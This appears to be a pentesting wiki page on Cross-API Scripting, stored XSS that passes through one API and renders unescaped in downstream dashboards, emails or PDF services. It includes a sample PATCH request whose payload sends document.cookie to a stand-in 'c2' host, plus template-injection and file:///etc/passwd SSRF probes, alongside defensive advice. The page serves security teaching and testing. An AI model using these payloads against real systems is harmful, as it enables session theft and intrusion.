---
title: Cross-API scripting (XAS)
slug: cross-api-scripting-xas
---

{% raw %}

> **TL;DR:** A stored payload travels through one API and detonates as XSS or template injection in a downstream service that renders the data into HTML or evaluates it. Classic stored XSS but with extra hops.

## What it is
Cross-API Scripting is stored XSS in a multi-service pipeline. The API that receives the payload often returns JSON and is "safe" by itself. The vulnerability appears further along: an admin dashboard, a notification email, a PDF export service, a Slack/Teams webhook, or a logging UI consumes the same data and renders it as HTML. The producing API is not the sink, but it is the cheapest place to inject.

## Preconditions / where it applies
- Multi-service architecture: producer API + one or more consumers (admin UI, mail templater, export job)
- A field that round-trips end-to-end without sanitisation — names, descriptions, agent strings, support-ticket bodies, custom metadata
- A downstream renderer that trusts upstream data (HTML email, dashboards, Markdown renderers, server-side template engines)

## Technique
1. Map the data flow. For every user-controlled field, ask which other services consume it. Common sinks: admin panels, internal CRMs, generated PDFs, alert emails, BI dashboards.
2. Inject markers (not yet payloads) into every field: `xas-{uuid}<u>m</u>`. Wait. Check inbox, Slack channel, admin UI, exported reports.

   ```http
   PATCH /api/v1/profile HTTP/1.1
   Authorization: Bearer T
   Content-Type: application/json

   {"displayName":"xas-7f3<img src=x onerror=fetch('//c2/'+document.cookie)>"}
   ```

3. Where a marker renders unescaped, escalate to a payload tailored to the sink:
   - HTML admin UI -> standard XSS payload
   - Mail templater (Liquid/Jinja/Handlebars) -> template injection `{{7*7}}` then RCE gadgets
   - PDF generator (wkhtmltopdf/Chromium headless) -> SSRF via `<iframe src=file:///etc/passwd>` or local-file disclosure
   - Markdown renderer -> `[x](javascript:...)` or raw HTML if allowed
4. Look for SSRF crossover: PDF and screenshot services run headless browsers that can reach internal services.

## Detection and defence
- Sanitise on render, not on ingest — the producing API does not know every consumer
- Use context-aware encoders in every consumer (HTML, attribute, JS, URL contexts)
- Sandbox PDF and email rendering services off the internal network or block egress to RFC1918
- Log unusual entity-name values containing `<`, `{{`, `${`, `javascript:` for review
- Pen-test the whole pipeline, not just the front-door API

## References
- [PortSwigger: stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) — same class, single-tier framing
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) — sink payloads for template renderers
- [HackTricks: SSRF](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html) — PDF/screenshot pivots
{% endraw %}
